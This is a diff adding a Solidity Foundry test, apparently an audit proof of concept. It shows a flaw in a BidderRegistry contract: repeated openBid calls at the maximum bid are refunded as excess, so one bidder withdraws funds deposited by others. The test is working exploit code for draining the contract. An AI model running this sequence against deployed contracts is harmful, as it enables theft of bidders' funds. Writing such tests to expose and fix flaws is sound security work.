@@ -458,4 +458,83 @@ contract BidderRegistryTest is Test {
         assertEq(balanceAfter - balanceBefore, 0);
         assertEq(bidderRegistry.getAccumulatedProtocolFee(), 100000000000000000);
     }
+
+    function test_OpenBidWithExcessExploit() public {
+        address aliceBidder = vm.addr(2);
+        address bodBidder = vm.addr(3);
+        uint64 blockNumber = uint64(blocksPerWindow + 1);
+
+        //1)  Deal some ETH to the Alice and Bob
+        vm.deal(aliceBidder, 10 ether);
+        vm.deal(bodBidder, 10 ether);
+
+        //2) Simulate the pre-confirmations contract
+        bidderRegistry.setPreconfManager(address(this));
+
+        //3) Deposit some funds for the next window
+        uint256 currentWindow = blockTracker.getCurrentWindow();
+        uint256 nextWindow = currentWindow + 1;
+        vm.prank(aliceBidder);
+        bidderRegistry.depositForWindow{value: 2 ether}(nextWindow);
+        vm.prank(bodBidder);
+        bidderRegistry.depositForWindow{value: 2 ether}(nextWindow);
+
+        // Capture balances before the exploit
+        uint256 aliceBalanceBefore = aliceBidder.balance;
+        uint256 bobBalanceBefore = bodBidder.balance;
+        uint256 registryBalanceBefore = address(bidderRegistry).balance;
+
+        // Expected balances before the exploit
+        assertEq(aliceBalanceBefore, 8 ether, "Alice balance BEFORE");
+        assertEq(bobBalanceBefore, 8 ether, "Bob balance BEFORE");
+        assertEq(registryBalanceBefore, 4 ether, "BidderRegistry balance BEFORE");
+
+        uint256 maxBid = bidderRegistry.maxBidPerBlock(aliceBidder, nextWindow);
+        //4) Alice open bids at maxBid multiple times
+        vm.startPrank(address(this));
+        // First bid works fine. maxBid is depleted from lockedFunds
+        bidderRegistry.openBid(
+            keccak256("commitment1"),
+            maxBid,
+            aliceBidder,
+            blockNumber
+        );
+        // Second bid start the stealing show. maxBid is being refunded (by the excess logic) and lockedFunds is NOT depleted.
+        // This is effectively stealing from poor Bob.
+        bidderRegistry.openBid(
+            keccak256("commitment2"),
+            maxBid,
+            aliceBidder,
+            blockNumber
+        );
+        // Thrid bid continue the stealing show, exactly behaving as the second bid.
+        bidderRegistry.openBid(
+            keccak256("commitment3"),
+            maxBid,
+            aliceBidder,
+            blockNumber
+        );
+
+        // And Alice could do this until she fully drain the bidderRegistry contract, effectively stealing from all the bidders.
+        vm.stopPrank();
+
+        //5) Alice withdraw her locked funds (which will be intact minus maxBid as being spent in the first bid)
+        blockNumber = uint64(blocksPerWindow * 2 + 1);
+        blockTracker.recordL1Block(blockNumber, "test");
+
+        uint256[] memory windows = new uint256[](1);
+        windows[0] = nextWindow;
+        vm.prank(aliceBidder);
+        bidderRegistry.withdrawFromWindows(windows);
+
+        // Capture balances after the exploit
+        uint256 aliceBalanceAfter = aliceBidder.balance;
+        uint256 bobBalanceAfter = bodBidder.balance;
+        uint256 registryBalanceAfter = address(bidderRegistry).balance;
+
+        // Expected balances after the exploit
+        assertEq(aliceBalanceAfter, 9.8 ether, "Alice balance AFTER");
+        assertEq(bobBalanceAfter, 8 ether, "Bob balance AFTER");
+        assertEq(registryBalanceAfter, 2.2 ether, "BidderRegistry balance AFTER");
+    }
 }
